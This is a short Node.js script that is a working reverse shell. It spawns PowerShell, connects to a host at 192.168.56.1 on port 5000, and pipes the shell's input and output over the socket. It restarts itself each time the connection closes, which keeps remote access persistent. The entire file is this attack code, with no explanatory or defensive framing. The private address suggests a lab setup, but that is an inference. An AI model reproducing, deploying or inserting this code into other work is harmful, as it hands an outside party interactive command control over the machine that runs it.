const net = require("net");
const cp = require("child_process");

var HOST = "192.168.56.1"

function startReverseShell() {
  const sh = cp.spawn("powershell", []);
  
  const client = new net.Socket();
  client.connect(5000, HOST, function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  
  // Handle the 'close' event of the client socket
  client.on('close', () => {
    console.log('');
    setTimeout(startReverseShell, 0);
  });
  
  return sh; // Return the child process reference
}

function loopReverseShell() {
  const shellProcess = startReverseShell();
  
  // Handle the exit event of the shell process if needed
  shellProcess.on("exit", (code, signal) => {
    console.log('');
  });
}

loopReverseShell();